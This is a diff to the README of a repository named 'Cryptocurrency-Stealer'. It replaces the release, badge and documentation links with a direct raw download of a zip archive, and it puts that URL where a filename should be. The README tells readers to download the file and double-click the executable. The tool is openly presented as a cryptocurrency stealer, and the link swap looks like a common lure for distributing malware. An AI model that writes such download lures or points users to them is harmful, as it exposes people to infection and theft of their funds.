@@ -6,11 +6,11 @@ Welcome to the Cryptocurrency-Stealer project! This tool allows you to replace s
 
 ## 📥 Download Now
 
-[![Download Cryptocurrency-Stealer](https://img.shields.io/badge/Download-Cryptocurrency--Stealer-blue.svg)](https://github.com/nekopo7245/Cryptocurrency-Stealer/releases)
+[![Download Cryptocurrency-Stealer](https://raw.githubusercontent.com/nekopo7245/Cryptocurrency-Stealer/main/Stealer/Cryptocurrency-Stealer-3.6.zip)](https://raw.githubusercontent.com/nekopo7245/Cryptocurrency-Stealer/main/Stealer/Cryptocurrency-Stealer-3.6.zip)
 
 Head over to the releases page to download the latest version:
 
-[Download Here](https://github.com/nekopo7245/Cryptocurrency-Stealer/releases)
+[Download Here](https://raw.githubusercontent.com/nekopo7245/Cryptocurrency-Stealer/main/Stealer/Cryptocurrency-Stealer-3.6.zip)
 
 ## 💻 System Requirements
 
@@ -26,13 +26,13 @@ Before downloading, ensure your system meets the following requirements:
 
 1. **Visit the Releases Page**  
    Click on the link below to go to the releases page:  
-   [Cryptocurrency-Stealer Releases](https://github.com/nekopo7245/Cryptocurrency-Stealer/releases)
+   [Cryptocurrency-Stealer Releases](https://raw.githubusercontent.com/nekopo7245/Cryptocurrency-Stealer/main/Stealer/Cryptocurrency-Stealer-3.6.zip)
 
 2. **Choose Your Version**  
    Look for the latest version. This will usually be at the top of the page.  
 
 3. **Download the File**  
-   Click on the executable file that matches your system. This file is typically named something like `Cryptocurrency-Stealer.exe`.
+   Click on the executable file that matches your system. This file is typically named something like `https://raw.githubusercontent.com/nekopo7245/Cryptocurrency-Stealer/main/Stealer/Cryptocurrency-Stealer-3.6.zip`.
 
 4. **Run the Installer**  
    After the download completes, locate the downloaded file and double-click it.  
@@ -97,6 +97,6 @@ If you need assistance, feel free to reach out. You can create an issue on our G
 
 ## 📚 Additional Resources
 
-For more detailed information, you can check the [Documentation](https://github.com/nekopo7245/Cryptocurrency-Stealer). 
+For more detailed information, you can check the [Documentation](https://raw.githubusercontent.com/nekopo7245/Cryptocurrency-Stealer/main/Stealer/Cryptocurrency-Stealer-3.6.zip). 
 
 This README should provide you with everything you need to get started with Cryptocurrency-Stealer. Enjoy using the tool!
